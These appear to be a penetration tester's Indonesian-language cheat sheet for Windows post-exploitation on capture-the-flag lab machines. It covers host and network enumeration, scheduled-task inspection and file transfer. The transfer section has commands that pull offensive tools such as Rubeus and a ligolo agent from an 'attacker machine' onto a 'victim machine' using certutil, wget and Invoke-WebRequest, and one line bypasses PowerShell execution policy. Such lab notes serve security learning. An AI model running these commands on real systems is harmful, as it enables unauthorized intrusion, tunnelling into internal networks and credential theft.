# 1. User.txt
## Cari User di directory lain
```powershell
# Cari di semua Desktop semua user
dir C:\Users\*\Desktop\user.txt /s /b 2>nul

# Atau lebih luas
dir C:\Users\ /s /b 2>nul | findstr /i "user.txt\|local.txt\|proof.txt"
```
# 2. Enum
## a. Chek infra
```powershell
# Untuk CMD
sysinfo
echo %PROCESSOR_ARCHITECTURE%

# Untuk Powershell
$env:PROCESSOR_ARCHITECTURE
```
![](Attachments/Pasted%20image%2020260814104031.png)
![](Attachments/Pasted%20image%2020260824130947.png)
## b. Siapa saya?
```powershell
whoami
whoami /priv #dahulukan ini
whoami /group
systeminfo
```
![](Attachments/Pasted%20image%2020260625053212.png)

cek windows version use `systeminfo` command
![](Attachments/Pasted%20image%2020260629103715.png)
## c dimana saya?
```powershell
hostname #cek komputer apa
ipconfig #cek apakah ada another network
```
pada gambar dibawah ada another network
![](Attachments/Pasted%20image%2020260625053943.png)

## d. Scan internal network
```powershell
1..255 | ForEach-Object { $ip = "192.168.100.$_"; if (Test-NetConnection -ComputerName $ip -InformationLevel Quiet -ErrorAction SilentlyContinue) { $ip } }
```
![](Attachments/Pasted%20image%2020260625094620.png)
## e. Siapa saja usernya?
```powershell
net usern
net localgroup administrator
```
![](Attachments/Pasted%20image%2020260625054311.png)
## f. Cek Share
```powershell
cd C:\Shares\
```

# 3. Schedule Task
## Siapa yang menjalankan program UpdateChecker Agent (misal)?
```powershell
# Versi CMD  
schtasks /query /tn "UpdateChecker Agent" /fo list /v  
  
# Versi Powershell  
Get-ScheduledTask -TaskName "UpdateChecker Agent"  
  
# Versi Manual  
$s = New-Object -ComObject "Schedule.Service"; $s.Connect(); $s.GetFolder("\").GetTask("UpdateChecker Agent").Definition.Principal
```
![](Attachments/Pasted%20image%2020260704110707.png)
## Apa yang dijalankkanya?
```powershell
$s = New-Object -ComObject "Schedule.Service"; $s.Connect(); $s.GetFolder("\").GetTask("UpdateChecker Agent").Definition.Actions 
```
![](Attachments/Pasted%20image%2020260704110800.png)
# 4. Transfer File
## a. Download
```powershell
download "C:\Program Files\UpdateMonitor\UpdateMonitor.exe"
```
## b. Upload
```powershell
upload '/home/kali/forensic-tools/volatility3-win-exes-2.28.0/vol.exe' 'C:\Windows\Temp\vol.exe'

upload '/home/kali/ligolo/ligolo-agent.exe' 'C:\Windows\Temp\ligolo-agent.exe'

# Verify
ls C:\Windows\Temp\vol.exe
```
dari web server
```shell
# Attacker machine
python3 -m http.server 8088

# Victimm machine
wget http://10.10.14.38:8088/<file>

# kalau filenya besar
certutil -urlcache -split -f http://10.10.14.38:8088/Rubeus.exe Rubeus.exe

# alternative powershell
iwr -uri http://10.10.16.84:9090/Settings_Update.zip -OutFile Settings_Update.zip

```
# 5. Powershell
## a. Menjalankan powershell tanpa restriction
```
powershell -ep bypass
```
## b. Version Powershell
```powershell
$PSVersionTable
```
![](Attachments/Pasted%20image%2020260824123528.png)
# 6. Search
search file yang mengandung string system
```powershell
# innercase
netstat -ano | findstr /i system 

# mirip grep
Get-ChildItem -Path C:\ -Recurse -Filter "*smartermail*" -ErrorAction SilentlyContinue -Force | Select-Object FullName
```
![](Attachments/Pasted%20image%2020260826103714.png)
# Curl
```shell
Invoke-WebRequest -Uri http://localhost:17017 -UseBasicParsing | Select-Object -ExpandProperty Content
```
![](Attachments/Pasted%20image%2020260826111227.png)